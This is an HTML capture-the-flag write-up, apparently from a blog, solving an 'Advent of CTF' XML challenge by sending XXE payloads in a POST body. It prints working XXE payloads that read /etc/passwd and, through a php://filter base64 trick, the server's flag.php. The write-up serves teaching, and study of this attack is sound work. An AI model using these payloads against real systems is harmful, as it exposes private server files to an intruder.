@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 21 Dec. 2022 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Advent of CTF - Challenge 13</title>
+<meta name="author" content="Arjen Wiersma" />
+<meta name="generator" content="Org Mode" />
+<meta description='Writings by Arjen'/>
+<link rel='alternate' type='application+rss/xml' title='Writings by Arjen' href='/posts/rss.xml'/>
+<link rel="stylesheet" href="../../../css/theme.css?v=20216e086cf8a20ead56908f3be0bcda6af2531ec1a68c9058ee7495590f57ea" type="text/css">
+</head>
+<body>
+<main id="content" class="content">
+<header>
+<h1 class="title">Advent of CTF - Challenge 13</h1>
+<p class="subtitle" role="doc-subtitle">&ldquo;XML&rdquo;</p>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgbb3ea0e">Challenge</a></li>
+<li><a href="#orgf178cdc">Solution</a></li>
+</ul>
+</div>
+</nav>
+
+<section id="outline-container-orgbb3ea0e" class="outline-2">
+<h2 id="orgbb3ea0e">Challenge</h2>
+<div class="outline-text-2" id="text-orgbb3ea0e">
+<p>
+This challenge deals with the insecurities of XML. On of the best documented &ldquo;features&rdquo; of XML is the ability to use Entities to extract data from a system, it is called XML eXternal Entities or XXE.
+</p>
+
+<p>
+What you will learn today:
+</p>
+
+<ul class="org-ul">
+<li>Edit and Resend requests with Firefox</li>
+<li>Identify an XML file</li>
+<li>Extract data using php filters (as we did in the last challenge)</li>
+</ul>
+</div>
+</section>
+
+<section id="outline-container-orgf178cdc" class="outline-2">
+<h2 id="orgf178cdc">Solution</h2>
+<div class="outline-text-2" id="text-orgf178cdc">
+<p>
+The challenge starts with a simple page listing the result of a post request.
+</p>
+
+
+<figure id="orge899335">
+<img src="index_att/start.png" alt="start.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Start screen</figcaption>
+</figure>
+
+<p>
+As this challenge requires the user to send a <i>POST</i> request to the webpage something more needs to be done to even start the challenge, a <i>POST</i> request needs to be made. There are many options, such as <i>Burp</i>, <i>curl</i> and many more custom made HTTP tools. For this writeup the DevTools (F12) will be used in Firefox (remember I said Firefox is the best tool here).
+</p>
+
+
+<figure id="org6857f14">
+<img src="index_att/devtools.png" alt="devtools.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>DevTools Network</figcaption>
+</figure>
+
+<p>
+Right click the line that performs a <i>GET</i> on the <code>/</code> resource. Then select the option <i>Edit and Resend</i> to modify this request.
+</p>
+
+
+<figure id="org8f8f434">
+<img src="index_att/edit-and-resend.png" alt="edit-and-resend.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Edit and resend</figcaption>
+</figure>
+
+<p>
+Change the method from <i>GET</i> to <i>POST</i>. Also, something should actually be posted. Try something like <i>appelflap</i>, or any other text really.
+</p>
+
+
+<figure id="org5db3f92">
+<img src="index_att/error-response.png" alt="error-response.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>XML Errors</figcaption>
+</figure>
+
+<p>
+The result of the modified request is that it shows a bunch of <i>XML</i> loading errors. So apparently the payload is interpreted as an XML file. Searching around for XML file issues you will land at the<a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">OWASP Top 10 XXE</a> page. There are some samples on the page that can be used
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Sample XXE</label><pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="ISO-8859-1"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+&lt;!<span class="org-nxml-text">DOCTYPE foo [</span>
+&lt;!<span class="org-nxml-text">ELEMENT foo ANY &gt;</span>
+&lt;!<span class="org-nxml-text">ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-entity-ref-delimiter">&amp;</span><span class="org-nxml-entity-ref-name">xxe</span><span class="org-nxml-entity-ref-delimiter">;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+Using this file as the request body will return the contents of the <code>/etc/passwd</code> file. XXE has been confirmed!
+</p>
+
+
+<figure id="orgeb72568">
+<img src="index_att/passwd.png" alt="passwd.png">
+
+</figure>
+
+<p>
+As it is known the flag is in <code>flag.php</code> and from the errors it is already clear that this file is next to <code>index.php</code> in <code>/var/www/html</code>, the payload can be modified to retrieve that file.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Payload 1 for flag.php</label><pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="ISO-8859-1"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+&lt;!<span class="org-nxml-text">DOCTYPE foo [</span>
+&lt;!<span class="org-nxml-text">ELEMENT foo ANY &gt;</span>
+&lt;!<span class="org-nxml-text">ENTITY xxe SYSTEM "file:///var/www/html/flag.php" &gt;]&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-entity-ref-delimiter">&amp;</span><span class="org-nxml-entity-ref-name">xxe</span><span class="org-nxml-entity-ref-delimiter">;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+The result is somewhat unexpected, which makes this a fun instead of straightforward, challenge.
+</p>
+
+
+<figure id="org80daefd">
+<img src="index_att/failed-flag.png" alt="failed-flag.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Result of failed payload</figcaption>
+</figure>
+
+<p>
+The error message says that it encountered an invalid element name. This means that it could read the file, but that the file is malformed for the XML reader. There are several ways to bypass this limitation, such as <code>CDATA</code> blocks, but as it is not possible to use an external service to retrieve an external DTD, something needs to be used that is available in the PHP xml parser.
+</p>
+
+<p>
+In the last challenge the <code>filter</code> was introduced. Leverage this filter to perform the same extraction of the file.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>XML Payload</label><pre class="src src-xml"><span class="org-nxml-processing-instruction-delimiter">&lt;?</span><span class="org-nxml-processing-instruction-target">xml</span> <span class="org-nxml-processing-instruction-content">version="1.0" encoding="ISO-8859-1"</span><span class="org-nxml-processing-instruction-delimiter">?&gt;</span>
+&lt;!<span class="org-nxml-text">DOCTYPE foo [</span>
+&lt;!<span class="org-nxml-text">ELEMENT foo ANY &gt;</span>
+&lt;!<span class="org-nxml-text">ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php" &gt;]&gt;</span>
+<span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-entity-ref-delimiter">&amp;</span><span class="org-nxml-entity-ref-name">xxe</span><span class="org-nxml-entity-ref-delimiter">;</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">foo</span><span class="org-nxml-tag-delimiter">&gt;</span>
+</pre>
+</div>
+
+<p>
+The result will be that the <code>flag.php</code> file is encoded in Base64 and added to the result that is shown on the page.
+</p>
+
+
+<figure id="orgcc26bdc">
+<img src="index_att/payload.png" alt="payload.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Successfull payload</figcaption>
+</figure>
+
+<p>
+Copy the base64 into CyberChef and read the PHP code. There is a flag in <code>$flag</code>.
+</p>
+
+
+<figure id="orge7bd3e5">
+<img src="index_att/flag.png" alt="flag.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>The flag</figcaption>
+</figure>
+
+<p>
+Grab your points and your badge! The challenge is solved.
+</p>
+
+<p>
+<img src="index_att/badge.png" alt="badge.png">
+Go back to the <a href="../../../index.html">homepage</a>.
+</p>
+</div>
+</section>
+</main>
+<footer id="postamble" class="status">
+<p class="author">Author: Arjen Wiersma</p>
+<p class="date">Created: 21 Dec. 2022</p>
+</footer>
+</body>
+</html>
